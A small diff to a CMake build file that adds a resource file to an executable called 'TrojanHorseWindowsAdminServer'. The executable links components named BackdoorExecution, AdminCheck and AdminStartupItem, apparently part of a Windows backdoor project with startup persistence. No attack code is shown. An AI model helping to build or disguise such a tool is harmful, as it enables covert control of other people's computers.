@@ -1,4 +1,4 @@
-add_executable(TrojanHorseWindowsAdminServer main.cpp)
+add_executable(TrojanHorseWindowsAdminServer main.cpp resource.rc)
 target_link_libraries(TrojanHorseWindowsAdminServer PUBLIC SharedConstants BackdoorExecution AdminCheck PathToCurrentExecutable AdminStartupItem CombaseLibrary)
 
 if (CMAKE_SYSTEM_NAME STREQUAL "Windows")
